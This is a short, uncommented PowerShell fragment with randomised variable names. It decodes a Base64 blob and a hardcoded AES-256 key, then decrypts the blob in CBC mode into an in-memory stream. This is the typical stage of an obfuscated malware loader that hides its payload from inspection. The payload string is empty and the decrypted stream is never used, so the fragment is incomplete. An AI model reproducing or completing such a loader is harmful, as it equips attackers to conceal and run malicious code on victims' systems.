$pzkmcap = [System.Convert]::FromBase64String("")
$vioupw = New-Object "System.Security.Cryptography.AesManaged"
$ojmig = [System.Convert]::FromBase64String("57M1KrangSO51t4OZ4LeAzSZ/rx/ztBFNHoPVjspMiM=")
$vioupw.IV = $pzkmcap[0..15]
$vioupw.KeySize = 256
$vioupw.Key = $ojmig
$vioupw.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$vioupw.BlockSize = 128
$vioupw.Mode = [System.Security.Cryptography.CipherMode]::CBC
$rmrzt = New-Object System.IO.MemoryStream(,$vioupw.CreateDecryptor().TransformFinalBlock($pzkmcap,16,$pzkmcap.Length-16))
